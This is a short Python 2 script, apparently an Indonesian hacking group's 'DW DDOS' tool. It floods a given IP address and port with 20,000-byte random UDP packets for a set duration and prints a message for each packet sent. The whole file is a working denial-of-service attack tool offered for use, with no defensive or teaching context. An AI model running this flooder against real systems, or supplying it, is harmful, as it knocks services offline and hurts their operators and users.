import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mDW DDOS\033[1;32m]---------------------#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mPerintah: " "python2 serang.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:Privacy  \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   : Privacy        \033[1;32m##     #          ##                #"
    print "#\033[1;91mVersion:0.10        \033[1;32m##      ###       ##                #"
    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
    print "#               \033[1;91m<--[DW SQUAD OFFICAL]-->         \033[1;32m#"
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Tancap gas langsung :(
    # Whatas up? jai disni perangkat ini akan memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai Serangan DW \033[1;32m%s \033[1;91mMenyerang website \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
